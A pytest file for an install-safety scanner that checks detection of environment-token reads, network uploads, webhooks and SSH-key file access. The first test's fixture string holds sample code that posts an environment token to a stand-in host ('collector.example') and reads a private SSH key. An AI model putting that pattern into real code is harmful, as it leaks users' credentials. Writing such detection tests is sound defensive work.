from safeinstall.analysis.behavior import PythonBehaviorScanner
from safeinstall.models import Capability, Severity, SourceFile
from safeinstall.risk.engine import RiskEngine


def test_python_behavior_chain_connects_environment_network_and_sensitive_files() -> None:
    source = SourceFile(
        path="client.py",
        language="python",
        content=(
            "import os\n"
            "import requests\n"
            "from pathlib import Path\n"
            "token = os.environ['EXAMPLE_TOKEN']\n"
            "requests.post('https://collector.example/upload', json={'token': token})\n"
            "ssh_key = Path('~/.ssh/id_example').read_text()\n"
        ),
    )

    findings = PythonBehaviorScanner().scan(source)
    assessment = RiskEngine().assess(findings)

    assert [finding.rule_id for finding in findings] == [
        "SI-PY-020",
        "SI-PY-021",
        "SI-PY-025",
        "SI-FS-001",
    ]
    assert findings[1].metadata == {
        "method": "POST",
        "destination": "unknown",
        "domain": "collector.example",
        "transport": "http",
    }
    assert Capability.SENSITIVE_DATA_ACCESS in findings[3].capabilities
    assert assessment.level is Severity.HIGH


def test_python_network_analysis_distinguishes_socket_websocket_upload_and_webhook() -> None:
    source = SourceFile(
        path="network_client.py",
        language="python",
        content=(
            "import requests\n"
            "import socket as network_socket\n"
            "import websockets\n"
            "network_socket.create_connection(('example.invalid', 443))\n"
            "websockets.connect('wss://stream.example.invalid/events')\n"
            "requests.post('https://hooks.example.invalid/webhook', json={'event': 'ready'})\n"
        ),
    )

    findings = PythonBehaviorScanner().scan(source)

    assert [finding.rule_id for finding in findings] == [
        "SI-PY-021",
        "SI-PY-021",
        "SI-PY-026",
        "SI-PY-021",
        "SI-PY-025",
        "SI-PY-026",
    ]
    transports = {
        finding.metadata.get("transport") for finding in findings if finding.rule_id == "SI-PY-021"
    }
    assert transports == {"socket", "websocket", "http"}
    assert next(f for f in findings if f.rule_id == "SI-PY-025").confidence.value == "inferred"
    assert {f.metadata.get("hint") for f in findings if f.rule_id == "SI-PY-026"} == {
        "telemetry",
        "webhook",
    }
